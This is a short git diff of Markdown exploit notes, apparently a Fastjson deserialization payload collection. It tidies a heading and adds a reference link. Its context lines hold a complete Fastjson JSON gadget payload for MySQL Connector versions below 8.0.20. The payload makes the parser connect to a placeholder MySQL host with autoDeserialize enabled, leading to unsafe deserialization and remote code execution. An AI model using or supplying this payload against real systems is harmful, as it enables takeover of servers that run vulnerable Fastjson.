@@ -1171,9 +1171,11 @@ Mysqlconnector 6.0.2 or 6.0.3
 Mysqlconnector 6.x or < 8.0.20
 {"@type":"java.lang.AutoCloseable","@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection","proxy":{"@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy","connectionUrl":{"@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl", "masters": [{"host":"mysql.host"}], "slaves":[], "properties":{"host":"mysql.host","user":"user","dbname":"dbname","password":"pass","queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true"}}}}
 ```
-**mysql **
+**mysql**
+
 https://summersec.github.io/BlogParpers/2021/Fastjson_Mysql_gadget%E5%A4%8D%E7%8E%B0.html
 
+https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&mid=2247485232&idx=1&sn=7ad52820b928490ef1f99d99f034634e&chksm=fa973a5fcde0b3494ccfad9b1b97cfe44f7a6821b4bfaf745ea0444bd22427924df708283a69&mpshare=1&scene=23&srcid=0105duYSClRYYZDbH0ZK52ow&sharer_sharetime=1641355729426&sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd
 
 ### fastjson未知版本
 待探索
